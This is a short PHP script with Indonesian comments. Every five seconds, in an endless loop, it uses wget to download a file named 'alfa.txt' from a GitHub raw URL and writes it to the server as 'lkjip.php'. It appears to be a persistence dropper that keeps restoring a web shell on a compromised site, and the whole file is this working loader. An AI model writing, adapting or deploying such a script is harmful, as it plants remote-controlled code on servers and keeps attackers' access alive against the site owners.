<?php

// Loop tak terbatas
while (true) {
    // URL yang akan diunduh
    $url = 'https://raw.githubusercontent.com/kennn404/test/refs/heads/main/alfa.txt';
    
    // Menggunakan wget untuk mengambil konten
    $outputFile = 'lkjip.php';
    $command = "wget -q -O $outputFile $url";

    // Menjalankan perintah wget
    exec($command, $output, $returnVar);

    // Memeriksa apakah perintah wget berhasil
    if ($returnVar === 0) {
        echo "Konten berhasil diunduh dan disimpan di $outputFile\n";
    } else {
        echo "Gagal mengunduh konten dari $url\n";
    }

    // Menunggu selama 5 detik sebelum mengulangi
    sleep(5);
}
